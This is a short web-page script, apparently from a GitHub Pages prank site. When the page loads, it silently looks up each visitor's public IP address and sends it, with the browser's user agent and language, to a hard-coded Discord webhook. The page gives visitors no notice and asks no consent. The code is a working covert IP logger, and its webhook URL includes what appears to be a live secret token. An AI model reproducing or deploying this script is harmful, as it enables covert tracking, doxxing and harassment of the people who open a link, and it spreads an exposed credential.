<script>
  const webhookUrl = "https://discord.com/api/webhooks/1446998835229626412/aL3byydfp-9STVBzdf8SMsAiTASlJFHxQrjts7rttPgGlhcCvNE1adAd2ESDJd5qdS4B";

  // Get visitor IP
  fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(data => {
      const ip = data.ip;

      const payload = {
        content: " New visitor on kaypranks.github.io",
        embeds: [
          {
            title: "Visitor Details",
            color: 5814783,
            fields: [
              { name: "IP Address", value: ip, inline: false },
              { name: "User Agent", value: navigator.userAgent, inline: false },
              { name: "Language", value: navigator.language, inline: true }
            ]
          }
        ]
      };

      fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      }).catch(err => console.error("Webhook error:", err));
    })
    .catch(err => console.error("IP fetch error:", err));
</script>
